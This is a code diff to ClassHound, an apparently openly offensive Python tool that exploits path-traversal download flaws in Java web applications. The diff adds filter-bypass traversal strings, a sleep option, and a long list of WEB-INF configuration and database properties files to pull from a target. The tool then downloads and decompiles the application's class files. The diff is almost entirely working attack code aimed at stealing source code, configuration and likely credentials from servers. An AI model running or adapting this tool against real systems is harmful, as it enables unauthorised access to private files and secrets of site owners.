@@ -26,8 +26,9 @@ except ImportError:
 
 
 def request():
-    global url, post_data, headers
-
+    global url, sleep_time, post_data, headers
+    if sleep_time > 0:
+        time.sleep(sleep_time)
     try:
         if not post_data:
             r = session.get(url, headers=headers, verify=False, timeout=30, allow_redirects=True)
@@ -96,6 +97,7 @@ def download_and_save_file(travel_file_path, auto_change_count=False):
         sys.stdout.write('\r[-] Download: [{}] failed'.format(travel_file_path))
     sys.stdout.flush()
 
+    # 没下载成功并使用 --auto 时
     if auto_change_count and not success:
         ranges = range(1, max_count)
         ranges.remove(travel_char_count)
@@ -117,7 +119,7 @@ def download_and_save_file(travel_file_path, auto_change_count=False):
 
 
 def decompile_and_download_class(class_path):
-    command = 'java -jar {} {}'.format(os.path.join(current_dir, 'cfr-0.145.jar'), class_path)
+    command = 'java -jar {} {}'.format(os.path.join(current_dir, 'thirdparty', 'cfr-0.145.jar'), class_path)
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()
     # 保存反编译的 class 文件
@@ -212,7 +214,7 @@ if __name__ == '__main__':
                   ,,,,,     o' \,=./ `o    |.===.    
                  /(o o)\       (o o)       {}o o{}   
               ooO--(_)--OooooO--(_)--OooooO--(_)--Ooo        
-                                                            ClassHound v0.5\n
+                                                            ClassHound v1.0\n
 ''')
     try:
         current_dir = os.path.dirname(os.path.join(os.path.abspath(sys.argv[0]))).encode('utf-8').decode()
@@ -235,13 +237,14 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--post', dest='raw_post_data', default='', help='POST data, file path must surrounded with delimiter char')
     parser.add_argument('-f', '--file', dest='url_file', default='', help='specify need download file url path list')
     parser.add_argument('-a', '--auto', dest='auto_change', default=False, action='store_true', help='auto detect and change travel char count when use -f options')
+    parser.add_argument('-s', '--sleep-time', dest='sleep_time', default=0, type=float, help='sleep_time some seconds between two requests')
     parser.add_argument('-bp', '--base-path', dest='base_path', default='/', help='/WEB-INF folder prefix web path, default: "/".\nSuch as: change it to "opt/tomcat/webapps/"')
     parser.add_argument('-tc', '--travel-char', dest='travel_char', default='', help='specify travel char like ../')
     parser.add_argument('-cc', '--char-count', dest='travel_char_count', default=0, type=int, help='travel char count number')
     parser.add_argument('-dc', '--delimiter-char', dest='delimiter_char', default='#', help='Delimiter char that surround file path , default: #')
     parser.add_argument('-hh', '--http-header', dest='http_header', default='', help='Add http request header, format: "Referer:http://127.0.0.1,admin:true"')
     parser.add_argument('-hp', '--http-proxy', dest='http_proxy', default=None, help='set http/https proxy')
-    parser.add_argument('-mc', '--max-count', dest='max_count', default=10, type=int, help='max try travel char count, default: 10')
+    parser.add_argument('-mc', '--max-count', dest='max_count', default=8, type=int, help='max try travel char count, default: 10')
 
     if len(sys.argv) == 1:
         sys.argv.append('-h')
@@ -250,6 +253,7 @@ if __name__ == '__main__':
     raw_url = args.raw_url
     keyword = args.keyword
     auto = args.auto_change
+    sleep_time = args.sleep_time
     max_count = args.max_count
     http_proxy = args.http_proxy
     download_path = args.url_file
@@ -310,7 +314,17 @@ if __name__ == '__main__':
         '/java/applet/',
         '/java/security/',
 
+        '/cn/alanx/',
+        '/cn/chinadoi/',
+
         '/net/sf/',
+        '/net/coobird/',
+        '/net/sourceforge/',
+
+        '/sun/net/',
+        '/jxl/write/',
+
+        '/de/innosystec/',
 
         '/org/jcp/',
         '/org/omg/',
@@ -319,18 +333,26 @@ if __name__ == '__main__':
         '/org/json/',
         '/org/jdom/',
         '/org/slf4j/',
+        '/org/dom4j/',
+        '/org/jfree/',
+        '/org/tuckey/',
+        '/org/quartz/',
         '/org/apache/',
         '/org/hibernate/',
         '/org/htmlparser/',
         '/org/aopalliance/',
+        '/org/logicalcobwebs/',
         '/org/springframework/',
 
         '/com/sun/',
         '/com/octo/',
+        '/com/jacob/',
+        '/com/fredck/'
         '/com/oracle/',
         '/com/google/',
         '/com/alipay/',
         '/com/aliyun/',
+        '/com/alibaba/',
         '/com/tencent/',
         '/com/aliyuncs/',
         '/com/baidubce/',
@@ -347,6 +369,7 @@ if __name__ == '__main__':
     session.mount('http://', HTTPAdapter(max_retries=3))
     session.mount('https://', HTTPAdapter(max_retries=3))
 
+    # 设置额外 HTTP headers
     if http_header:
         for header in http_header.split(","):
             header = header.strip()
@@ -365,44 +388,87 @@ if __name__ == '__main__':
     except IndexError:
         normal_path = "fake path"
         exit('Cannot match valid file path in the middle of "{0} {0}"'.format(delimiter))
-
+    # 获得正常下载请求的状态码和内容
     normal_status_code, normal_content = request()
+    # 没指定遍历字符时自动探测遍历字符
     if not travel_char:
         travel_char = '../'
+        # 正常文件名倒数第二位插入 ./ 探测目标是否会替换 ./ 为空字符
         change_url_data(normal_path[:-1] + './' + normal_path[-1])
         char_status_code, char_content = request()
+        # 被替换
         if char_status_code == normal_status_code and char_content == normal_content:
             travel_char = '...//'
+            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
             change_url_data(normal_path[:-1] + '../' + normal_path[-1])
             char_status_code, char_content = request()
+            # 被替换
             if char_status_code == normal_status_code and char_content == normal_content:
                 travel_char = '.....///'
         else:
+            # 正常文件名倒数第二位插入 ../ 探测目标是否会替换 ../ 为空字符
             change_url_data(normal_path[:-1] + '../' + normal_path[-1])
             char_status_code, char_content = request()
+            # 被替换
             if char_status_code == normal_status_code and char_content == normal_content:
                 travel_char = '....//'
 
+    # 首次尝试下载的文件
     init_travel_files = [
         (base_path if base_path != "/" else "") + 'WEB-INF/web.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/config.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/spring-config.xml',
         (base_path if base_path != "/" else "") + 'WEB-INF/struts-config.xml',
         (base_path if base_path != "/" else "") + 'WEB-INF/applicationContext.xml',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/web.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring-mvc.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring-config.xml',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring/spring.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/mybatis-config.xml',
         (base_path if base_path != "/" else "") + 'WEB-INF/classes/applicationContext.xml',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/mybatis/mybatis-config.xml',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/spring.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/config.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/database.properties',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/config/config.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/config/database.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/config/application.properties',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/properties/database.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/properties/application.properties',
+
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/app.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/spring.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/config.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/database.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/properties.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/application.properties',
+        (base_path if base_path != "/" else "") + 'WEB-INF/classes/META-INF/properties/database.properties',
     ]
+
     for travel_file in init_travel_files:
-        for x in range(1, max_count):
-            if travel_char_count != 0:
-                change_url_data(travel_char * travel_char_count + travel_file)
-            else:
-                change_url_data(travel_char * x + travel_file)
+        # 手动指定遍历字符数量不再自动探测
+        if travel_char_count != 0:
+            change_url_data(travel_char * travel_char_count + travel_file)
             try_status_code, try_content = request()
             if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
-                travel_char_count = x if travel_char_count == 0 else travel_char_count
                 save_file(own_dir, travel_file, try_content)
-                print('[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
-                break
-
+                print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
+        else:
+            for x in range(1, max_count + 1):
+                change_url_data(travel_char * x + travel_file)
+                try_status_code, try_content = request()
+                if try_content and try_status_code == normal_status_code and keyword not in str(try_content):
+                    travel_char_count = x if travel_char_count == 0 else travel_char_count
+                    save_file(own_dir, travel_file, try_content)
+                    print('\r[+] Download: [{}] success!  Travel Char: [{}]  Count: [{}]'.format(travel_file, travel_char, travel_char_count))
+                    break
     try:
+        # 指定了额外的下载文件列表
         if download_path:
             print("[+] Starting download from [{}] file ...".format(download_path))
             if os.path.isfile(download_path):
@@ -411,9 +477,9 @@ if __name__ == '__main__':
                         if line.strip():
                             download_and_save_file(line.strip(), auto_change_count=True)
             else:
-                exit("[-] File [{}] do not exists".format(download_path))
+                exit("[-] File [{}] not exists".format(download_path))
         else:
-            print("[+] Starting download [.xml] files parsing from [web.xml] file ...")
+            print("\r[+] Starting download [.xml] files ...")
             # 循环解析下载 xml 文件
             continue_xml_parse_and_download = True
             while True and continue_xml_parse_and_download:
@@ -432,9 +498,9 @@ if __name__ == '__main__':
                 if not not_parsed_disk_xml_path_list:
                     continue_xml_parse_and_download = False
 
-            print("\n[+] Starting download [.class] files parsing from [.xml] files ...")
-            # 提取 xml 文件中 class 地址并下载到本地
-            class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|type="(.*?)"'
+            print("\r[+] Starting download [.class] files parsing from [.xml] files ...")
+            # 粗粒度提取 xml 文件中 class 地址并尝试下载到本地
+            class_pattern = '<.*?class>(.*?)</.*?class>|class="(.*?)"|type="(.*?)"|resource="(.*?)"'
             for fp in walk_file_paths(own_dir):
                 if fp.endswith('.xml'):
                     try:
@@ -443,17 +509,22 @@ if __name__ == '__main__':
                         m = re.findall(class_pattern, io.open(fp, 'r').read(), re.I | re.M | re.S)
                     if m:
                         for _m in m:
-                            p = _m[0] if _m[0] else (_m[1] if _m[1] else _m[2])
-                            class_url_path = base_path + 'WEB-INF/classes/' + p.replace(".", "/").strip() + '.class'
+                            match_m = _m[0]
+                            for x in range(0, len(_m)):
+                                if _m[x]:
+                                    match_m = _m[x]
+                                    break
+                            class_path_uri = match_m.replace(".", "/").strip()
+                            class_url_path = base_path + 'WEB-INF/classes/' + class_path_uri + '.class'
                             allow_download = True
                             for x in do_not_download_classes:
-                                if x in class_url_path:
+                                if ('/' + class_path_uri).startswith(x):
                                     allow_download = False
                             if allow_download and class_url_path not in already_download_class_url_list:
                                 download_and_save_file(class_url_path)
                                 already_download_class_url_list.append(class_url_path)
 
-            print("\n[+] Starting download [.class] files decompile from [.class] files ...")
+            print("\r[+] Starting download [.class] files decompile from [.class] files ...")
             # 循环反编译 class 文件并下载到本地
             continue_class_parse_and_download = True
             while True and continue_class_parse_and_download:
